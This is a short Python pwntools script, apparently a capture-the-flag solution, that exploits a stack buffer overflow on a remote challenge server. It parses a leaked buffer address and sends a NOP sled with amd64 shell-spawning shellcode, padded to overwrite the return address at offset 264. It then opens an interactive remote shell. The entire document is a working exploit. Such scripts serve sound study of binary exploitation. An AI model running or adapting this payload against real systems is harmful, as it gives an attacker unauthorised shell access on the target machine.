#!/usr/bin/env python3
from pwn import *
from pwnlib import *

context.context(arch='amd64', os='linux')
p = remote('challs.crate.nu', 51325)
# p = process('./c')

offset = 264

data = p.recvuntil(b': ')[:-2].split(b' ')[-1]
data = int(data, 16) + 8
buf_addr = p64(data)

shellcode = asm.asm(shellcraft.amd64.linux.sh())

payload = b'\x90' * 8 + shellcode + b'\x90' * (offset - 8 - len(shellcode)) + buf_addr

p.sendline(payload)

p.interactive()
